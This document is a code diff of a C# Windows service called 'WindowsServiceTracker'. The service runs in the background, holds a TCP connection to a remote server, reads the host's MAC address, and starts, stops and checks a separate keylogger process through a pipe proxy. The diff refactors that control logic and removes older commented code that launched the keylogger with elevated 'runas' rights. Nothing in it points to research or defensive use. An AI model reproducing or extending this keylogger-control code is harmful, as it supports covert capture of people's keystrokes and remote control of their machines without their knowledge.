@@ -33,8 +33,6 @@ namespace WindowsServiceTracker
         private const string ERROR_LOG_SOURCE = "WindowsServiceTracker";
         private const string EXTERNAL_PROCESS = "..\\..\\..\\WTKL\\bin\\Debug\\WTKL.exe";
 
-        //private Process keyLogger = null;
-        private ProcessStartInfo keyLoggerStartInfo;
         private IPEndPoint ipPort = new IPEndPoint(IP_ADDRESS, PORT);
         private volatile TcpClient tcp;
         private NetworkStream tcpStream;
@@ -43,9 +41,7 @@ namespace WindowsServiceTracker
         private KeyloggerCommInterface pipeProxy;
         private Thread tcpThread;
         private volatile bool tcpKeepAlive = true;
-        private volatile String macAddress = null;
-
-        //private Keylogger keylog = new Keylogger();
+        private volatile string macAddress = null;
 
         public Tracker()
         {
@@ -76,16 +72,10 @@ namespace WindowsServiceTracker
 
             tcpThread = new Thread(this.MaintainServerConnection);
             tcpThread.Start();
-
-            //StartKeyLogger();
         }
 
         protected override void OnStop()
         {
-            //Keylogger.Stop();
-            //SendStringMsg("Bye!");
-
-            //StopKeyLogger();
             StopKeylogger();
             Disconnect();
             tcpKeepAlive = false;
@@ -102,14 +92,32 @@ namespace WindowsServiceTracker
 
         public bool StartKeylogger()
         {
-            pipeProxy.StartKeylogger();
-            return true;
+            if (CheckIfRunning())
+            {
+                return pipeProxy.StartKeylogger();
+            }
+            return false;
         }
 
         public bool StopKeylogger()
         {
-            pipeProxy.StopKeylogger();
-            return true;
+            if (CheckIfRunning())
+            {
+                return pipeProxy.StopKeylogger();
+            }
+            return false;
+        }
+
+        public bool CheckIfRunning()
+        {
+            try
+            {
+                return pipeProxy.CheckIfRunning();
+            }
+            catch (Exception e)
+            {
+                return false;
+            }
         }
 
         private void WriteEventLogEntry(string eventLogInput)
@@ -118,9 +126,9 @@ namespace WindowsServiceTracker
             EventLog.WriteEntry(ERROR_LOG_SOURCE, eventLogInput, EventLogEntryType.Information);
         }
 
-        private String getMacAddress()
+        private string getMacAddress()
         {
-            string mac = String.Empty;
+            string mac = string.Empty;
 
             bool keepUnlessEthernet = false;
             foreach (NetworkInterface nic in NetworkInterface.GetAllNetworkInterfaces())
@@ -134,7 +142,7 @@ namespace WindowsServiceTracker
                     mac = nic.GetPhysicalAddress().ToString();
                     keepUnlessEthernet = true;
                 }
-                else if (mac == String.Empty && nic.OperationalStatus == OperationalStatus.Up)
+                else if (mac == string.Empty && nic.OperationalStatus == OperationalStatus.Up)
                 {
                     mac = nic.GetPhysicalAddress().ToString();
                 }
@@ -213,38 +221,6 @@ namespace WindowsServiceTracker
             }
         }
 
-        /*
-        private bool StartKeyLogger() //todo exception handling
-        {
-            if (keyLogger != null && keyLogger.Responding)
-            {
-                return true;
-            }
-            //Create a new process and change some startup info settings
-            keyLogger = new Process();
-            keyLoggerStartInfo = new ProcessStartInfo();
-
-            //File name here MUST MATCH the file name of the external process you've created
-            keyLoggerStartInfo.FileName = EXTERNAL_PROCESS;
-            //Verb = "runas" and UseShellExecute = true must be set for admin rights (I think)
-            keyLoggerStartInfo.Verb = "runas";
-            keyLoggerStartInfo.WindowStyle = ProcessWindowStyle.Normal;
-            keyLoggerStartInfo.UseShellExecute = true;
-
-            //Start the test process, look in TestProcess.cs for the actual process
-            keyLogger = Process.Start(keyLoggerStartInfo);
-            return true;
-        }*/
-
-        /*private bool StopKeyLogger() //todo exception handling
-        {
-            if (keyLogger != null)
-            {
-                keyLogger.Kill(); //todo explore better/safer options
-            }
-            return true;
-        }*/
-
         private bool Connect()
         {
             try
@@ -306,11 +282,11 @@ namespace WindowsServiceTracker
             return true;
         }
 
-        private bool SendStringMsg(String stringMsg)
+        private bool SendStringMsg(string stringMsg)
         {
             if (tcpStream != null && tcpStream.CanWrite)
             {
-                Byte[] msg = Encoding.UTF8.GetBytes(stringMsg + Environment.NewLine);
+                byte[] msg = Encoding.UTF8.GetBytes(stringMsg + Environment.NewLine);
                 tcpStream.Write(msg, 0, msg.Length);
                 return true;
             }
